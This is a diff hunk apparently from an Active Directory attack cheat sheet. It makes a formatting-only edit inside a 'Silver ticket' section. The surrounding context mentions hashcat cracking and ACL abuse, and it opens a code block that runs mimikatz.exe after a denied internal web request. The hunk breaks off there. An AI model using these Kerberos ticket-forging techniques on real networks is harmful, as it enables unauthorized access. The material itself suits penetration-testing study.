@@ -138,7 +138,7 @@ and crack it with `hashcat`. With `GenericWrite` or `GenericAll` permissions on 
 
 ### Silver ticket
 
-Takes Privileged Account Certificate (PAC) not to be enabled (usual): https://adsecurity.org/?p=2011
+Takes _Privileged Account Certificate_ (PAC) not to be enabled (usual): https://adsecurity.org/?p=2011
 ```
 PS > iwr -UseDefaultCredentials http://internalwebsite # access denied
 PS > c:\path\to\mimikatz.exe
